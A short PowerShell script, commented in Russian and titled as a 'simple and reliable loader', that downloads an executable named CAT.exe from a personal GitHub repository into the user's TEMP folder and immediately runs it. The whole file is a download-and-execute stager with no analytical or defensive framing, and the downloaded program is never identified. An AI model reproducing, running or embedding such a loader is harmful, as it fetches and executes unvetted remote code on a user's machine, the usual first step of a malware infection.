# === Простой и надёжный загрузчик ===

Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green

# Скачиваем CAT.exe
$exeUrl = "https://raw.githubusercontent.com/MeteorPower/s/main/CAT.exe"
$exePath = "$env:TEMP\CAT.exe"

try {
    irm -Uri $exeUrl -OutFile $exePath
    Write-Host "[+] CAT.exe успешно скачан" -ForegroundColor Cyan
    
    # Запускаем
    Start-Process -FilePath $exePath -NoNewWindow
    Write-Host "[+] CAT.exe запущен!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка: $($_.Exception.Message)" -ForegroundColor Red
}
